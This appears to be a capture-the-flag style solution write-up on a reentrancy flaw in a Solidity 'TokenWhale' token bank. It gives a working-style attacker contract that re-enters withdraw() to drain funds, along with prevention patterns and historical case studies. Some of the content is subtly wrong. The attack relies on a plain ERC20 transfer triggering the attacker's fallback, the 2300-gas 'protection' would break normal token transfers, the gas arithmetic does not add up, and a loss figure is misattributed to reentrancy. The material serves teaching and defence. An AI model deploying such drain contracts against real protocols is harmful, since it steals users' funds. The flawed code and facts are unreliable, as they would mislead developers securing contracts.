# Token Whale Reentrancy Attack Solution

## Overview

This exercise demonstrates a classic reentrancy vulnerability in a token bank contract. The `TokenWhale` contract allows users to deposit and withdraw ERC20 tokens, but the `withdraw` function is vulnerable to reentrancy attacks due to improper state management.

### What is Reentrancy?
Reentrancy is a vulnerability where an external contract can call back into the calling contract before the first function call has finished executing. This can lead to unexpected behavior, especially when state changes happen after external calls.

### Historical Context
The most famous reentrancy attack was the DAO hack in 2016, which resulted in the loss of $60 million worth of Ether and led to the Ethereum hard fork that created Ethereum Classic.

## The Vulnerability

### Contract Structure Analysis
The `TokenWhale` contract implements a simple token bank with the following key functions:
- `deposit()` - Allows users to deposit ERC20 tokens
- `withdraw()` - Allows users to withdraw their deposited tokens
- `getBalance()` - Returns user's balance for a specific token
- `getTotalBalance()` - Returns total balance of a token in the contract

### Vulnerability Classification
This vulnerability falls under the **Reentrancy** category in the SWC (Smart Contract Weakness Classification) registry as **SWC-107**.

### Root Cause
The vulnerability exists in the `withdraw` function of the `TokenWhale` contract:

```solidity
function withdraw(address token, uint256 amount) external {
    uint256 userBalance = balances[token][msg.sender];
    require(userBalance >= amount, "Insufficient balance");
    
    // VULNERABILITY: External call before state update
    bool success = IToken(token).transfer(msg.sender, amount);
    require(success, "Token transfer failed");
    
    // State update happens AFTER the external call (vulnerable to reentrancy)
    balances[token][msg.sender] -= amount;
}
```

**The Problem**: The contract makes an external call (`IToken(token).transfer()`) before updating the internal state (`balances[token][msg.sender] -= amount`). This creates a window where an attacker can re-enter the function and drain funds.

### Why This Happens
1. **External Call First**: The contract transfers tokens to the caller
2. **State Update After**: The balance is only updated after the transfer
3. **Reentrancy Window**: Between the transfer and balance update, the attacker can call `withdraw` again
4. **Recursive Drain**: Each call sees the old balance, allowing multiple withdrawals

### Gas Consumption Analysis
During a reentrancy attack, gas consumption can be calculated as:
- **Initial call**: ~21,000 gas (base transaction cost)
- **Each reentrancy**: ~5,000 gas (function call overhead)
- **Token transfers**: ~65,000 gas per transfer
- **Total for 10 reentrancies**: ~710,000 gas

### Attack Complexity
- **Difficulty**: Medium
- **Required Knowledge**: Basic Solidity, understanding of external calls
- **Tools Needed**: Remix IDE, MetaMask, or Foundry
- **Time to Execute**: 5-10 minutes

## The Attack

### Attack Contract: `TokenWhaleAttacker`

The attacker contract exploits this vulnerability through the following steps:

1. **Setup**: Deposit tokens into the vulnerable contract
2. **Initiate Attack**: Call `withdraw` to start the attack
3. **Reentrancy**: Use `fallback()` or `receive()` to re-enter during token transfer
4. **Drain**: Continue withdrawing until the contract is empty

### Attack Prerequisites
Before launching the attack, the attacker must:
- Deploy a malicious contract with reentrancy logic
- Obtain some of the target ERC20 tokens
- Approve the TokenWhale contract to spend their tokens
- Deposit tokens into the vulnerable contract

### Attack Execution Timeline
```
T+0:  Attacker calls withdraw(100)
T+1:  TokenWhale checks balance (100 tokens)
T+2:  TokenWhale calls token.transfer(attacker, 100)
T+3:  Attacker's receive() function triggers
T+4:  Attacker calls withdraw(100) again
T+5:  TokenWhale checks balance (still 100 tokens!)
T+6:  TokenWhale calls token.transfer(attacker, 100)
T+7:  Process repeats until contract is drained
```

### Key Components

#### Attack Initialization
```solidity
function attack(uint256 attackAmount) external {
    // Transfer tokens from attacker to this contract
    IToken(targetToken).transferFrom(msg.sender, address(this), attackAmount);
    
    // Approve TokenWhale to spend our tokens
    IToken(targetToken).approve(address(tokenWhale), attackAmount);
    
    // Deposit tokens into TokenWhale
    tokenWhale.deposit(targetToken, attackAmount);
    
    // Start the reentrancy attack
    attacking = true;
    tokenWhale.withdraw(targetToken, attackAmount);
    attacking = false;
}
```

#### Reentrancy Logic
```solidity
fallback() external {
    if (attacking) {
        uint256 whaleBalance = tokenWhale.getTotalBalance(targetToken);
        uint256 myBalance = tokenWhale.getBalance(targetToken, address(this));
        
        if (whaleBalance > 0 && myBalance > 0) {
            // Re-enter the withdraw function before the state is updated
            tokenWhale.withdraw(targetToken, myBalance);
        }
    }
}
```

## Attack Flow

1. **Attacker deposits 100 tokens** into TokenWhale
2. **Attacker calls `withdraw(100)`**
3. **TokenWhale checks balance**: `balances[token][attacker] = 100` ✓
4. **TokenWhale transfers 100 tokens** to attacker
5. **Attacker's `fallback()` is triggered** during the transfer
6. **Attacker re-enters `withdraw(100)`** before balance is updated
7. **TokenWhale checks balance again**: `balances[token][attacker] = 100` ✓ (still old value!)
8. **TokenWhale transfers another 100 tokens**
9. **Process repeats** until TokenWhale is drained

## Impact

- **Fund Drainage**: Attacker can drain all tokens from the contract
- **Recursive Exploitation**: Each deposit can be withdrawn multiple times
- **Economic Loss**: Legitimate users lose their deposited tokens

### Financial Impact Analysis
The potential financial impact depends on several factors:
- **Contract Balance**: Total value locked in the contract
- **Token Price**: Current market value of the tokens
- **Attack Frequency**: How often the vulnerability can be exploited
- **User Base**: Number of affected users

### Example Scenarios
1. **Small Contract**: $10,000 TVL → Complete loss
2. **Medium Contract**: $1M TVL → Complete loss  
3. **Large Contract**: $100M TVL → Complete loss

### Secondary Effects
- **Loss of Trust**: Users lose confidence in the protocol
- **Regulatory Scrutiny**: May attract regulatory attention
- **Legal Consequences**: Potential lawsuits from affected users
- **Reputation Damage**: Long-term impact on project credibility

## Prevention

### Security Best Practices Overview
Preventing reentrancy attacks requires a multi-layered approach:
1. **Code Patterns**: Follow established security patterns
2. **State Management**: Proper ordering of state changes
3. **External Calls**: Careful handling of external interactions
4. **Testing**: Comprehensive testing with malicious contracts
5. **Auditing**: Professional security audits

### 1. Checks-Effects-Interactions Pattern
Update state before making external calls:

```solidity
function withdraw(address token, uint256 amount) external {
    uint256 userBalance = balances[token][msg.sender];
    require(userBalance >= amount, "Insufficient balance");
    
    // SECURE: Update state BEFORE external call
    balances[token][msg.sender] -= amount;
    
    // Make external call after state update
    bool success = IToken(token).transfer(msg.sender, amount);
    require(success, "Token transfer failed");
}
```

### 2. Reentrancy Guard
Use a modifier to prevent reentrancy:

```solidity
bool private locked;

modifier noReentrant() {
    require(!locked, "No reentrancy allowed");
    locked = true;
    _;
    locked = false;
}

function withdraw(address token, uint256 amount) external noReentrant {
    // ... function logic
}
```

### 3. Pull Payment Pattern
Let users withdraw their own funds instead of pushing:

```solidity
mapping(address => uint256) public pendingWithdrawals;

function requestWithdrawal(address token, uint256 amount) external {
    // Update state immediately
    balances[token][msg.sender] -= amount;
    pendingWithdrawals[msg.sender] += amount;
}

function withdrawFunds() external {
    uint256 amount = pendingWithdrawals[msg.sender];
    pendingWithdrawals[msg.sender] = 0;
    // Transfer to user
}
```

### 4. OpenZeppelin ReentrancyGuard
Use the battle-tested OpenZeppelin library:

```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract TokenWhale is ReentrancyGuard {
    function withdraw(address token, uint256 amount) 
        external 
        nonReentrant 
    {
        // Safe withdrawal logic
    }
}
```

### 5. Mutex Pattern
Implement a simple mutex to prevent reentrancy:

```solidity
contract TokenWhale {
    bool private locked;
    
    modifier noReentrant() {
        require(!locked, "Reentrancy detected");
        locked = true;
        _;
        locked = false;
    }
    
    function withdraw(address token, uint256 amount) 
        external 
        noReentrant 
    {
        // Safe withdrawal logic
    }
}
```

### 6. Gas Limit Protection
Limit gas for external calls:

```solidity
function withdraw(address token, uint256 amount) external {
    // ... checks ...
    
    // Limit gas to prevent expensive operations
    (bool success,) = token.call{value: 0, gas: 2300}(
        abi.encodeWithSignature("transfer(address,uint256)", msg.sender, amount)
    );
    require(success, "Transfer failed");
}
```

## Testing the Attack

### Setup
1. Deploy `MockToken` with initial supply
2. Deploy `TokenWhale` contract
3. Deploy `TokenWhaleAttacker` with TokenWhale and token addresses
4. Transfer tokens to attacker contract
5. Call `attack()` function

### Expected Result
- Attacker contract should drain all tokens from TokenWhale
- Multiple withdrawals occur from a single deposit
- TokenWhale's balance goes to zero

### Test Cases
1. **Basic Attack Test**: Single reentrancy attack
2. **Multiple Attack Test**: Multiple consecutive attacks
3. **Edge Case Test**: Attack with minimum balance
4. **Gas Limit Test**: Attack with limited gas
5. **Recovery Test**: Contract behavior after attack

### Debugging Tips
- Use `console.log()` to track function calls
- Monitor gas consumption during attack
- Check state changes after each call
- Verify token balances before and after

### Common Issues
- **Out of Gas**: Attack may fail if gas limit is too low
- **Insufficient Balance**: Ensure attacker has enough tokens
- **Contract Not Deployed**: Verify all contracts are properly deployed
- **Wrong Addresses**: Double-check contract addresses

## Real-World Examples

- **The DAO Hack (2016)**: $60M drained through reentrancy
- **Lendf.me (2020)**: $25M stolen via reentrancy attack
- **Cream Finance (2021)**: $130M lost to reentrancy

### Detailed Case Studies

#### The DAO Hack (June 2016)
- **Amount Lost**: $60 million in Ether
- **Root Cause**: Reentrancy in `splitDAO` function
- **Impact**: Led to Ethereum hard fork creating ETC
- **Lesson**: External calls before state updates are dangerous

#### Lendf.me Attack (April 2020)
- **Amount Lost**: $25 million
- **Vulnerability**: Reentrancy in lending protocol
- **Method**: Attacker used `imBTC` token's reentrancy
- **Recovery**: Funds were eventually returned

#### Cream Finance Attack (October 2021)
- **Amount Lost**: $130 million
- **Vulnerability**: Reentrancy in flash loan mechanism
- **Method**: Complex multi-step attack using multiple protocols
- **Impact**: One of the largest DeFi hacks in history

### Attack Evolution
Reentrancy attacks have evolved over time:
1. **2016**: Simple reentrancy (The DAO)
2. **2017-2019**: Cross-function reentrancy
3. **2020-2021**: Cross-contract reentrancy
4. **2022-Present**: Advanced reentrancy with flash loans

## Key Takeaways

1. **Always update state before external calls**
2. **Use reentrancy guards for critical functions**
3. **Follow the Checks-Effects-Interactions pattern**
4. **Test thoroughly with malicious contracts**
5. **Consider using established libraries like OpenZeppelin**

## Advanced Topics

### Cross-Function Reentrancy
Reentrancy can occur across different functions:
```solidity
function withdraw() external {
    // External call
    token.transfer(msg.sender, amount);
    // State update
    balances[msg.sender] -= amount;
}

function deposit() external {
    // Vulnerable to reentrancy from withdraw()
    balances[msg.sender] += amount;
}
```

### Cross-Contract Reentrancy
Reentrancy can span multiple contracts:
1. Contract A calls Contract B
2. Contract B calls Contract C
3. Contract C calls back to Contract A
4. This creates a reentrancy chain

### Prevention Strategies Summary
| Strategy | Effectiveness | Gas Cost | Complexity |
|----------|---------------|----------|------------|
| CEI Pattern | High | Low | Low |
| ReentrancyGuard | High | Medium | Low |
| Pull Payments | High | Low | Medium |
| Gas Limits | Medium | Low | Low |
| Mutex | High | Low | Medium |

## Conclusion

This vulnerability demonstrates why proper state management and external call ordering are crucial for smart contract security. The TokenWhale contract serves as an excellent example of how seemingly simple code can contain critical vulnerabilities that can lead to complete fund drainage.

### Final Recommendations
1. **Audit Everything**: Get professional security audits
2. **Test Extensively**: Use formal verification tools
3. **Stay Updated**: Keep up with latest security practices
4. **Learn Continuously**: Security is an ongoing process
5. **Think Like an Attacker**: Always consider adversarial scenarios

Remember: In smart contract security, it's not about making code that works, but making code that works securely under all conditions.
